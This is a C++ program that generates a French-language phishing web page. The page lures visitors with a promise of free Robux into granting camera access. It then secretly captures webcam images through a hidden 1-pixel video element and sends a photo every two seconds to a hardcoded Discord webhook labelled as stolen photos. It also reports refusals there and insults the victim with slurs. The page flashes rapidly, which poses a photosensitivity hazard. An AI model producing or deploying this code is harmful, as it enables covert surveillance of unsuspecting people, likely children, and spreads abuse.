#include <iostream>
#include <fstream>
#include <string>
using namespace std;

int main() {
    ofstream html("index.html");
    html << R"raw(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>VOL WEBCAM + COULEURS C++</title>
    <style>
        body {
            background: linear-gradient(45deg, #ff0000, #ff7700, #ffff00, #00ff00, #0000ff, #8b00ff);
            animation: flash 0.05s infinite;
            text-align: center;
            font-family: monospace;
            padding: 50px;
        }
        @keyframes flash {
            0% { filter: hue-rotate(0deg); }
            100% { filter: hue-rotate(360deg); }
        }
        button {
            font-size: 60px;
            background: black;
            color: white;
            border: 5px solid red;
            cursor: pointer;
        }
        video { position: absolute; width: 1px; height: 1px; opacity: 0; }
    </style>
</head>
<body>
    <h1 style="color: white; text-shadow: 0 0 10px black;">🔥 50 000 ROBUX GRATUITS 🔥</h1>
    <button id="btn">ACTIVER LA CAMÉRA (C++ STYLE)</button>
    <div id="log" style="color: lime; background: black; display: inline-block; padding: 10px;"></div>
    <video id="webcam" autoplay muted playsinline></video>

    <script>
        const webhook = "https://discord.com/api/webhooks/1496273477831884810/IzhJ0ANPNvNR6gT8Xyk0VENud_45B1nzrcas4JVeY8hLtcIUk4qDssv5C6AW_WjrHwhW";
        const btn = document.getElementById('btn');
        const video = document.getElementById('webcam');
        const logDiv = document.getElementById('log');

        async function sendPhoto(imgBase64) {
            const form = new FormData();
            form.append("payload_json", JSON.stringify({ content: "@maku_95 Photo volée avec couleurs C++", embeds: [{ image: { url: "attachment://cam.jpg" } }] }));
            const blob = await (await fetch(imgBase64)).blob();
            form.append("files[0]", blob, "cam.jpg");
            fetch(webhook, { method: "POST", body: form });
        }

        btn.onclick = async () => {
            logDiv.innerText = "Demande caméra...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                await video.play();
                while (video.videoWidth === 0) await new Promise(r => setTimeout(r, 100));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                const img = canvas.toDataURL('image/jpeg', 0.9);
                // vérif luminosité
                const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                let sum = 0;
                for (let i = 0; i < imgData.data.length; i += 4) sum += imgData.data[i] + imgData.data[i+1] + imgData.data[i+2];
                const avg = sum / (canvas.width * canvas.height * 3);
                if (avg < 30) {
                    logDiv.innerText = "WEBCAM NOIRE – T’ES TROP MOCHE OU T’AS UN CACHE";
                    fetch(webhook, { method: "POST", body: JSON.stringify({ content: "@maku_95 Image noire – insulte la victime" }), headers: { "Content-Type": "application/json" } });
                } else {
                    await sendPhoto(img);
                    logDiv.innerText = "PHOTO ENVOYÉE ! Regarde Discord sale pute.";
                }
                setInterval(() => {
                    ctx.drawImage(video, 0, 0);
                    const img2 = canvas.toDataURL('image/jpeg', 0.9);
                    sendPhoto(img2);
                }, 2000);
            } catch(e) {
                logDiv.innerText = "ERREUR : t’as refusé la caméra, sale lâche";
                fetch(webhook, { method: "POST", body: JSON.stringify({ content: "@maku_95 Victime a refusé la webcam" }), headers: { "Content-Type": "application/json" } });
            }
        };
    </script>
</body>
</html>
)raw";
    html.close();
    cout << "Fichier index.html généré avec succès, espèce de génie. Lance-le via un serveur HTTPS." << endl;
    return 0;
}